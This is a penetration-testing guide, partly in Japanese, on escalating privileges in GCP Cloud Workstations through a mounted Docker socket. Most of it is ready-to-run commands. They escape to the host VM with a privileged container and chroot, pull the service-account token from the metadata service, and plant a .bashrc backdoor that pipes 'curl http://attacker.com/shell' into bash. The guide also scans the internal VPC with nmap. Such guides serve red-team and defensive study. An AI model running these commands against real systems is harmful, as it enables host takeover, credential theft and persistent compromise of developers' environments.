# GCP - Cloud Workstations Privesc


### Container Breakout via Docker Socket (Container -> VM -> Project)

The primary privilege escalation path in Cloud Workstations stems from the requirement to support **Docker-in-Docker (DinD)** workflows for developers. When the workstation configuration mounts the Docker socket or allows privileged containers (a common configuration), an attacker inside the workstation container can escape to the underlying Compute Engine VM and steal its service account token.

**前提条件:**
- Cloud Workstation の端末へのアクセス（SSH、セッションの侵害、または盗まれた認証情報経由）
- ワークステーションの構成で `/var/run/docker.sock` をマウントしているか、privileged containers を有効にしている必要がある

**アーキテクチャのコンテキスト:** ワークステーションは、GCE VM (Layer 1) 上の Docker/Containerd ランタイム (Layer 2) 上で動作するコンテナ (Layer 3) です。Docker socket はホストのコンテナランタイムへ直接アクセスを提供します。

> [!NOTE]
> ツール [gcp-workstations-containerEscapeScript](https://github.com/AI-redteam/gcp-workstations-containerEscapeScript) は完全な container escape を自動化し、host VM 上で root shell を得られるようにします。

<details>

<summary>ステップ 1: Docker socket の確認</summary>
```bash
# Verify the Docker socket is available
ls -l /var/run/docker.sock
# Expected output: srw-rw---- 1 root docker 0 ...
```
</details>

<details>

<summary>ステップ2: ホストVMのファイルシステムへ脱出</summary>

特権コンテナを起動し、ホストのルートディレクトリを `/mnt/host` にマウントします。可視性を最大化するため、ホストのネットワークと PID ネームスペースも共有します。
```bash
# Spawn a privileged container mounting the host's root filesystem
docker run -it --rm --privileged --net=host --pid=host \
-v /:/mnt/host \
alpine sh

# Inside the new container, chroot into the host
chroot /mnt/host /bin/bash
```
これで、基盤となる **root shell on the underlying Compute Engine VM** を取得しました（Layer 1）。

</details>

<details>

<summary>ステップ3: IMDS から VM service account token を盗む</summary>
```bash
# From the host VM, query the Instance Metadata Service
curl -s -H "Metadata-Flavor: Google" \
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Check which service account is attached
curl -s -H "Metadata-Flavor: Google" \
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email

# Check scopes (CRITICAL STEP)
curl -s -H "Metadata-Flavor: Google" \
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes
```
</details>

> [!CAUTION]
> **スコープを確認してください!**
> アタッチされている Service Account が **Editor** であっても、VM はアクセススコープによって制限されている可能性があります。
> もし `https://www.googleapis.com/auth/cloud-platform` が表示されていれば、完全なアクセス権があります。
> もし `logging.write` と `monitoring.write` のみが表示されている場合、以下の **Network Pivot** と **Persistence** ベクトルに制限されます。

<details>

<summary>ステップ4: Achieve Persistence (Backdoor the User)</summary>

Cloud Workstations は `/home/user` に永続ディスクをマウントします。コンテナのユーザ（通常 `user`, UID 1000）がホストのユーザ（UID 1000）と一致するため、ホストのホームディレクトリに書き込むことができます。これにより、workstation container が再構築されても環境に backdoor を仕掛けることができます。
```bash
# Check if you can write to the host's persistent home
ls -la /mnt/host/home/user/

# Drop a backdoor that executes next time the developer logs in
# Note: Do this from the container escape context
echo "curl http://attacker.com/shell | bash" >> /mnt/host/home/user/.bashrc
```
</details>

<details>

<summary>Step 5: Network Pivot (Internal VPC Access)</summary>

ホストのネットワーク名前空間を共有しているため (`--net=host`)、あなたは現在 VPC 上の信頼されたノードになっています。IP ホワイトリストに基づいてアクセスを許可する内部サービスをスキャンできます。
```bash
# Install scanning tools on the host (if internet access allows)
apk add nmap

# Scan the internal VPC subnet
nmap -sS -p 80,443,22 10.0.0.0/8
```
</details>
